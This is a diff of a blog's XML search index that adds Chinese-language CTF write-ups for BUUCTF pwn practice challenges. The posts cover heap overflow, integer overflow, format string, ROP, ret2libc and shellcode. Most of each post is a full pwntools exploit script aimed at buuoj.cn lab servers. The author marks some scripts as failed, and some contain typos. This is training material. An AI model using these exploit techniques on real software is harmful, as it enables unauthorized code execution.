@@ -4,11 +4,223 @@
   
     
     <entry>
+      <title>babyheap_0ctf_2017</title>
+      <link href="/2022/01/23/babayheap/"/>
+      <url>/2022/01/23/babayheap/</url>
+      
+        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/23/babayheap/checksec.png" alt="image-20220123155106885" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/23/babayheap/run.png" alt="image-20220123155242621" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/23/babayheap/main.png" alt="image-20220123155433486" style="zoom:80%;"><ol><li><p>allocate函数,根据用户输入size根据大小进行内存分配,本程序调用了calloc函数,与malloc不同的是分配内存后会把数据区域全部置0</p></li><li><p>fill,用户提供需要修改堆块的index和要修改的size,然后根据size读取用户输入,问题就出现在size可以由用户输入,我们可以任意构造size,实现伪造堆块的效果</p></li><li><img src="/2022/01/23/babayheap/fill.png" alt="image-20220123160726616" style="zoom: 50%;"></li><li><p>free 将堆块free</p></li><li><p>dump,根据堆块大小显示出堆块中的内容</p></li></ol><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'amd64', log_level = 'debug')elf = ELF("./babyheap")local = 0if local:    r = process("./babyheap") else:    r = remote("node4.buuoj.cn",26810)    def allocate(size):    r.recvuntil("Command: ")    r.sendline("1")    r.recvuntil("Size: ")    r.sendline(str(size))    def fill(index,content):    r.recvuntil("Command: ")    r.sendine("2")    r.recvuntil("Index: ")    r.sendline(str(index))    r.recvuntil("Size: ")    r.sendline(str(len(content)))    r.recvuntil("Content: ")    r.sendline(content)    def free(index):    r.recvuntil("Command: ")    r.sendline("3")    r.recvuntil("Index: ")    r.sendline(str(index))    def dump(index):    r.recvuntil("Command: ")    r.sendline("4")    r.recvuntil("Index: ")    r.sendline(str(index))    r.recvline()    return r.recvline()allocate(0x10) # 0allocate(0x10) # 1allocate(0x10) # 2allocate(0x10) # 3allocate(0x10) # 4free(1)free(2)payload = p64(0)*3payload += p64(0x21)payload += p64(0)*3payload += p64(0x21)payload += p64(0x80)fill(0,payload)payload = p64(0)*3payload += p64(0x21)fill(3,payload) # 为了后面malloc做准备,绕过检查allocate(0x10)allocate(0x10)fill(1,'aaaabbbb')fill(2,'bbbbcccc')payload = p64(0)*3payload += p64(0x91)fill(3,payload)allocate(0x80)free(4)libc_base = u64(dump(2)[:8].strip().ljust(8,'\x00')) -0x3c4b78log.info("libc_base: "+ hex(libc_base))allocate(0x60)free(4)payload = p64(libc_base + 0x3c4aed)fill(2,payload)allocate(0x60)allocate(0x60)payload = p8(0)*3payload += p64(0)*2payload += p64(libc_base+0x4527a)fill(6,payload)allocate(255)r.interactive()# this exp is failed,next one                 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+            <tag> heap </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pwn2_sctf_2016</title>
+      <link href="/2022/01/23/pwn2/"/>
+      <url>/2022/01/23/pwn2/</url>
+      
+        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/23/pwn2/checksec.png" alt="image-20220123143008389" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/23/pwn2/run.png" alt="image-20220123143215385" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/23/pwn2/main.png" alt="image-20220123143341071" style="zoom:80%;"><img src="/2022/01/23/pwn2/vuln.png" alt="image-20220123143513120" style="zoom:80%;"><p>在程序中搜索既没有system又没有bin/sh,所以明显的rop</p><p>nptr处可以使用整数溢出构造rop</p><p>然后可以利用printf函数来泄露程序的libc版本</p><p>覆盖返回地址执行system来getshell</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *from LibcSearcher import *context(os = 'linux', arch = 'i386', log_level = 'debug')elf = ELF("./pwn2")local = 0if local:    r = process("./pwn2")else:    r = remote("node4.buuoj.cn",25331)printf_plt = elf.plt['printf']printf_got = elf.got['printf']main_addr = elf.symbols['main']r.recvuntil("How many bytes do you want me to read?")r.sendline("-1")leak_payload = b'a'*(0x2C+0x4)+p32(printf_plt)+p32(main_addr)+p32(printf_got)r.recvuntil("data!\n")r.sendline(leak_payload)r.recvuntil("\n")printf_addr = u32(r.recv(4))log.success("the printf_addr is " + hex(printf_addr))libc = LibcSearcher('printf',printf_addr)libc_base = printf_addr - libc.dump('printf')system_addr = libc_base + libc.dump('system')str_bin_sh_addr= libc_base + libc.dump('str_bin_sh')r.recvuntil("How many bytes do you want me to read?")r.sendline("-1")r.recvuntil("data!\n")payload = b'a'*(0x2C+0x4)+p32(system_addr)+p32(main_addr)+p32(str_bin_sh_addr)r.sendline(payload)r.interactive()    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+            <tag> 整数溢出 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>fm</title>
+      <link href="/2022/01/23/fm/"/>
+      <url>/2022/01/23/fm/</url>
+      
+        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/23/fm/checksec.png" alt="image-20220123103302076" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/23/fm/run.png" alt="image-20220123103550362" style="zoom:80%;"><p>可以看到参数在栈上的位置为11</p><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/23/fm/main.png" alt="image-20220123103953760" style="zoom:80%;"><p>很明显,如果我们需要使x的值为4,则需要来利用格式化字符串漏洞实现任意地址读写.</p><p>x的地址</p><img src="/2022/01/23/fm/x.png" alt="image-20220123141606735" style="zoom:80%;"><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'i386',log_level = 'debug')elf = ELF("./fm")local = 0if local:    r = process("./fm")else:    r = remote("node4.buuoj.cn",25572)x_addr = 0x0804A02Cpayload = p32(x_addr) + b"%11$n"r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+            <tag> 格式化字符串 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>bjdctf_2020_babystack2</title>
+      <link href="/2022/01/23/babystack2/"/>
+      <url>/2022/01/23/babystack2/</url>
+      
+        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/23/babystack2/checksec.png" alt="image-20220123100651893" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/23/babystack2/main.png" alt="image-20220123100733616" style="zoom:80%;"><p>想要让read函数溢出,起码要让read的nbytes大于0x10,但是if 条件中若nbtytes大于0x10则会退出,所以这里存在一个整数溢出,如果我们输入-1,则会变成无符号数的最大值,这样就可以溢出.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'amd64',log_level = 'debug')elf = ELF("./babystack2")local = 0if local:    r = process("./babystack2")else:    r = remote("node4.buuoj.cn",27245)backdoor = 0x0000000000400726r.recvuntil("[+]Please input the length of your name:")r.sendline("-1")r.recvuntil("[+]What's u name?")payload = b'a'*(0x10+0x8) + p64(backdoor)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+            <tag> 栈溢出 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>bjdctf_2020_babyrop</title>
+      <link href="/2022/01/22/2020-babyrop/"/>
+      <url>/2022/01/22/2020-babyrop/</url>
+      
+        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/22/2020-babyrop/checksec.png" alt="image-20220122140903977" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/22/2020-babyrop/run.png" alt="image-20220122141326579" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><p>发现溢出点</p><img src="/2022/01/22/2020-babyrop/vuln.png" alt="image-20220122141525939" style="zoom:80%;"><p>经过搜索,既没有system函数,也没有bin/sh字符串,所以可以使用rop,使用pwntools自带的dynELF</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>使用puts函数泄露地址,因为是64位程序,所以需要找到一个pop rdi</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ROPgadget --binary 2020_babyrop --only "pop|ret"|grep "rdi"0x0000000000400733 : pop rdi ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 首先写一个leak函数,泄露函数地址def leak(addr):    count = 0    up = ''    content = ''    payload += b'A'*(0x20+0x8) # padding    payload += p64(pop_rdi)    payload += p64(addr)    payload += p64(puts_addr) #调用puts    payload += p64(main_addr) #返回main函数,刷新环境    r.send(payload)    r.recv()    while True:        #无限循环读取,防止recv()读取不全        c = r.recv(numb=1,timeout=0.1)#没读取一个字节,设置超时时间确保没有遗漏        count += 1        if up == '\n'and c == "":   #上一个字符是回车且读不到其他字符,说明读完了            content = content[:-1]+'\x00' #最后一个字符置为\x00            break        else:            content += c #拼接输出            up = c    content = content[:4]#截取最后一段作为返回值,提供给DynELF处理    log.info("%#x =&gt; %s" % (addr,(content or '').encode('hex')))    return content<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'amd64',log_level = 'debug')elf = ELF("./2020_babyrop")local = 0if local:    r = process("./2020_babyrop")else:    r = remote("node4.buuoj.cn",28690)pop_rdi = 0x0400733puts_addr = elf.symbols['puts']main_addr = 0x04006CBdef leak(addr):    count = 0    up = ''    content = ''    payload += b'A'*(0x20+0x8) # padding    payload += p64(pop_rdi)    payload += p64(addr)    payload += p64(puts_addr) #调用puts    payload += p64(main_addr) #返回main函数,刷新环境    r.send(payload)    r.recv()    while True:        #无限循环读取,防止recv()读取不全        c = r.recv(numb=1,timeout=0.1)#没读取一个字节,设置超时时间确保没有遗漏        count += 1        if up == '\n'and c == "":   #上一个字符是回车且读不到其他字符,说明读完了            content = content[:-1]+'\x00' #最后一个字符置为\x00            break        else:            content += c #拼接输出            up = c    content = content[:4]#截取最后一段作为返回值,提供给DynELF处理    log.info("%#x =&gt; %s" % (addr,(content or '').encode('hex')))    return contentd = DynELF(leak,elf = elf)system_addr = d.lookup('system',libc)log.success("system_addr="+hex(system_addr))r.interactive()# 使用dynELF好像不太行,换种方法吧<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">#这次直接泄露地址,然后使用在线工具查询from pwn import *context(os = 'linux',arch = 'amd64',log_level = 'debug')elf = ELF("./2020_babyrop")local = 0if local:    r = process("./2020_babyrop")else:    r = remote("node4.buuoj.cn",28690)pop_rdi = 0x0400733puts_plt = elf.plt['puts']puts_got = elf.got['puts']main_addr = 0x04006CB#这次利用puts_plt和puts_got泄露puts函数的地址payload1 = b'A'*(0x20+0x8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)r.sendline(payload1)r.recv()puts_addr = u64(r.recv(6).ljust(8,'\x00'))#u64()函数的参数必须要8字节的字符串,这里puts_addr地址只有6字节,所以需要ljust方法补齐8字节才能被u64()函数执行log.success("puts_addr="+hex(puts_addr))r.interactive()#这个exp也不太行,再换个<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">#这次使用LibcSearcherfrom pwn import *from LibcSearcher import *context(os = 'linux',arch = 'amd64',log_level = 'debug')elf = ELF("./2020_babyrop")local = 0if local:    r = process("./2020_babyrop")else:    r = remote("node4.buuoj.cn",28690)pop_rdi = 0x0000000000400733puts_plt = elf.plt['puts']puts_got = elf.got['puts']main_addr = elf.symbols['main']payload = 'a'*(0x20+0x8)payload += p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)r.recvuntil("Pull up your sword and tell me u story!")r.sendline(payload)r.recv()puts_addr = u64(r.recv(6).ljust(8,'\x00'))libc = LibcSearcher('puts',puts_addr)libc_base = puts_addr - libc.dump('puts')system_addr = libc_base+libc.dump('system')bin_addr = libc_base+libc.dump('str_bin_sh')payload1 = 'a'*(0x20+0x8)+p64(pop_rdi)+p64(bin_addr)+p64(system_addr)r.recvuntil("story!\n")r.sendline(payload1)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+            <tag> 栈溢出 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>2018_rop</title>
+      <link href="/2022/01/22/2018-rop/"/>
+      <url>/2022/01/22/2018-rop/</url>
+      
+        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/22/2018-rop/checksec.png" alt="image-20220122120000677" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/22/2018-rop/main.png" alt="image-20220122120046570" style="zoom:80%;"><p>发现main函数中调用了两个函数</p><img src="/2022/01/22/2018-rop/be.png" alt="image-20220122120144750" style="zoom:80%;"><img src="/2022/01/22/2018-rop/buf.png" alt="image-20220122120242644" style="zoom:80%;"><p>在第二个调用函数中发现了溢出点.</p><p>经过在ida中搜索,发现既没有system函数也没有bin/sh字符串,所以要想办法泄露出libc函数的地址来得到libc版本,找到system函数和bin/sh地址偏移.</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux',arch = 'i386', log_level = 'debug')elf = ELF("./2018_rop")local = 0if local:    r = process("./2018_rop")else:    r = remote("node4.buuoj.cn",26131)read_plt = elf.plt['read']print("read_plt="+hex(read_plt))read_got = elf.got['read']print("read_got="+hex(read_got))main_addr = 0x080484C6write_plt = elf.plt['write']print("write_plt="+hex(write_plt))write_got = elf.got['write']print("write_got"+hex(write_got))payload1 = b'a'*(0x88+0x8) + p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(0x4)r.sendline(payload1)write_addr = u32(r.recv(4))#最后泄露出libc版本是libc6-i386_2.27-3ubuntu1_amd64#write_offset = 0x0e4e30#system_offset = 0x046a20#str_bin_sh_offset = 0x165ca8write_offset = 0x0e56f0system_offset = 0x03cd10str_bin_sh_offset = 0x17b8cflibc_base = write_addr - write_offsetsystem_addr = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offsetpayload2 = b'a'*(0x88+0x4)+p32(system_addr)++p32(0)p32(str_bin_sh)r.sendline(payload2)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>others_shellcode</title>
+      <link href="/2022/01/22/others-shellcode/"/>
+      <url>/2022/01/22/others-shellcode/</url>
+      
+        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/22/others-shellcode/checksec.png" alt="image-20220122112755447" style="zoom:80%;"><p>发现开了nx和pie两种保护.</p><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><p>运行一下发现,程序出现了命令提示符,输入linux命令还可以执行.</p><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/22/others-shellcode/main.png" alt="image-20220122113313782" style="zoom:80%;"><p>main函数啥也没有,直接调用了getshell函数</p><img src="/2022/01/22/others-shellcode/getshell.png" alt="image-20220122113419292" style="zoom:80%;"><p>发现出现了系统调用.</p><p>直接nc,发现可以直接cat flag.</p><img src="/2022/01/22/others-shellcode/flag.png" alt="image-20220122113824467" style="zoom:80%;">]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ciscn_2019_n_5</title>
+      <link href="/2022/01/21/ciscn-2019-n-5/"/>
+      <url>/2022/01/21/ciscn-2019-n-5/</url>
+      
+        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><img src="/2022/01/21/ciscn-2019-n-5/checksec.png" alt="image-20220121110154608" style="zoom:80%;"><p>啥保护都没开,而且还有RWX段</p><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/21/ciscn-2019-n-5/run.png" alt="image-20220121110421109" style="zoom:80%;"><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/21/ciscn-2019-n-5/main.png" alt="image-20220121110531596" style="zoom:80%;"><p>明显的栈溢出</p><p>因为NX保护没有开,所以我们可以使用shellcode,找一段合适的内存</p><img src="/2022/01/21/ciscn-2019-n-5/buf.png" alt="image-20220121111331331" style="zoom:80%;"><p>这一段就很合适</p><img src="/2022/01/21/ciscn-2019-n-5/name.png" alt="image-20220121113141560" style="zoom:80%;"><p>刚好第一次输入的name就位与这个段,所以我们可以在第一次输入的时候将shellcode输进去,然后在第二次输入的时候利用栈溢出再回到这里执行shellcode,从而getshell.</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os = 'linux', arch = 'amd64', log_level = 'debug')elf = ELF("./ciscn5")local = 0if local:    r = process("./ciscn5")else:    r = remote("node4.buuoj.cn",27656)shellcode = asm(shellcraft.sh())bss_addr = 0x0601080payload = b'a'*(0x20+0x8) + p64(bss_addr)r.sendlineafter("name\n",shellcode)r.sendlineafter("me?\n",payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> pwn </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+            <tag> 栈溢出 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>jarvisoj_level2_x64</title>
       <link href="/2022/01/21/level2-x64/"/>
       <url>/2022/01/21/level2-x64/</url>
       
-        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>除了NX,其他啥保护都没开.</p><img src="/2022/01/21/level2-x64/checksec.png" alt="image-20220121100440210" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/21/level2-x64/run.png" alt="image-20220121100643937" style="zoom:80%;"><p>说明格式化字符串没有用</p><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/21/level2-x64/main.png" alt="image-20220121100907723" style="zoom:80%;"><p>有system函数</p><img src="/2022/01/21/level2-x64/buf.png" alt="image-20220121103729091" style="zoom:80%;"><p>很容易看出这是一道简单的栈溢出的题.</p><img src="/2022/01/21/level2-x64/bin_sh.png" alt="image-20220121101002521" style="zoom:80%;"><p>有bin/sh字符串</p><p>因为是64位,所以需要使用寄存器传参,所以我们要找一个pop rdi,这里使用ROPgadget</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ROPgadget --binary level2_x64 --only 'pop|ret' | grep 'rdi'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">0x00000000004006b3 : pop rdi ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch='amd64',log_level='log_level')elf = ELF("./level2_x64")local = 0if local:    r = process("./level2_x64")else:    r = remote("node4.buuoj.cn",25582)bin_sh = 0x0600A90system_addr = 0x040063Epop_rdi = 0x04006b3payload = b'a'*(0x80+0x8) + p64(pop_rdi)+p64(bin_sh)+p64(system_addr)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(ps:这道题有点太简单吧,我都没啥可写了.)</p>]]></content>
+        <content type="html"><![CDATA[<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>除了NX,其他啥保护都没开.</p><img src="/2022/01/21/level2-x64/checksec.png" alt="image-20220121100440210" style="zoom:80%;"><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><img src="/2022/01/21/level2-x64/run.png" alt="image-20220121100643937" style="zoom:80%;"><p>说明格式化字符串没有用</p><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><img src="/2022/01/21/level2-x64/main.png" alt="image-20220121100907723" style="zoom:80%;"><p>有system函数</p><img src="/2022/01/21/level2-x64/buf.png" alt="image-20220121103729091" style="zoom:80%;"><p>很容易看出这是一道简单的栈溢出的题.</p><img src="/2022/01/21/level2-x64/bin_sh.png" alt="image-20220121101002521" style="zoom:80%;"><p>有bin/sh字符串</p><p>因为是64位,所以需要使用寄存器传参,所以我们要找一个pop rdi,这里使用ROPgadget</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ROPgadget --binary level2_x64 --only 'pop|ret' | grep 'rdi'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">0x00000000004006b3 : pop rdi ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch='amd64',log_level='debug')elf = ELF("./level2_x64")local = 0if local:    r = process("./level2_x64")else:    r = remote("node4.buuoj.cn",25582)bin_sh = 0x0600A90system_addr = 0x040063Epop_rdi = 0x04006b3payload = b'a'*(0x80+0x8) + p64(pop_rdi)+p64(bin_sh)+p64(system_addr)r.sendline(payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(ps:这道题有点太简单吧,我都没啥可写了.)</p>]]></content>
       
       
       <categories>
@@ -386,7 +598,7 @@
       <link href="/2022/01/14/noname/"/>
       <url>/2022/01/14/noname/</url>
       
-        <content type="html"><![CDATA[<h3 id="1-flat-args-preprocessor-None-length-None-filler-de-bruijn"><a href="#1-flat-args-preprocessor-None-length-None-filler-de-bruijn" class="headerlink" title="1. flat(*args, preprocessor = None, length = None, filler = de_bruijn(),"></a><strong>1. flat(*args, preprocessor = None, length = None, filler = de_bruijn(),</strong></h3><p>Flattens the arguments into a string.</p><p>This function takes an arbitrary number of arbitrarily nested lists, tuples and dictionaries. It will then find every string and number inside those and flatten them out. Strings are inserted directly while numbers are packed using the <a href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.pack"><code>pack()</code></a> function. Unicode strings are UTF-8 encoded.</p><p>Dictionary keys give offsets at which to place the corresponding values (which are recursively flattened). Offsets are relative to where the flattened dictionary occurs in the output (i.e. <code>{0: 'foo'}</code> is equivalent to <code>'foo'</code>). Offsets can be integers, unicode strings or regular strings. Integer offsets &gt;= <code>2**(word_size-8)</code> are converted to a string using <a href="https://docs.pwntools.com/en/stable/util/packing.html#pwnlib.util.packing.pack"><code>pack()</code></a>. Unicode strings are UTF-8 encoded. After these conversions offsets are either integers or strings. In the latter case, the offset will be the lowest index at which the string occurs in filler. See examples below.</p><h3 id="2-fmtstr-payload"><a href="#2-fmtstr-payload" class="headerlink" title="2. fmtstr_payload()"></a>2. fmtstr_payload()</h3><p><strong>fmtstr_payload</strong>是pwntools里面的一个工具,用来简化对格式化字符串漏洞的构造工作.可以实现修改任意内存.</p><p>fmtstr_payload(偏移,{源地址,目的地址})</p><blockquote><p><strong>fmtstr_payload(offset,writes,numbwritten=0,write_size=’byte’)</strong></p></blockquote><blockquote><ul><li>第一个参数表示格式化字符串的偏移;</li><li>第二个参数表示需要利用%n写入的数据,采用字典形式</li><li>第三个参数表示已经输出的字符的个数,默认为0</li><li>第四个参数表=表示写入方式,是按字节(byte),双字节(short),四字节(int),分别对应hhn,hn,n,默认值为hhn.</li><li>返回值就是payload</li></ul></blockquote><p>  常用形式: fmtstr_payload(offset,{key:value})</p><p>  <strong>以下为pwnlib中的解释</strong>: <a href="https://docs.pwntools.com/en/stable/fmtstr.html">fmtstr_payload</a></p><p>  <code>pwnlib.fmtstr.fmtstr_payload</code><strong>(<em><strong>offset</strong></em>,</strong> <em>writes</em><strong>,</strong> <em>numbwritten=0</em><strong>,</strong> <em>write_size=’byte’</em><strong>)</strong> <strong>→ str</strong>[<a href="https://github.com/Gallopsled/pwntools/blob/67b28491a4/pwnlib/fmtstr.py#L759-L814">source</a>]</p><p>  Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from <code>context.bits</code></p><p>  The overflows argument is a format-string-length to output-amount tradeoff: Larger values for <code>overflows</code> produce shorter format strings that generate more output at runtime.</p><p>Parameters:<br><strong>offset</strong> (<a href="https://docs.python.org/3.8/library/functions.html#int"><em>int</em></a>) – the first formatter’s offset you control<br><strong>writes</strong> (<a href="https://docs.python.org/3.8/library/stdtypes.html#dict"><em>dict</em></a>) – dict with addr, value <code>{addr: value, addr2: value2}</code><br><strong>numbwritten</strong> (<a 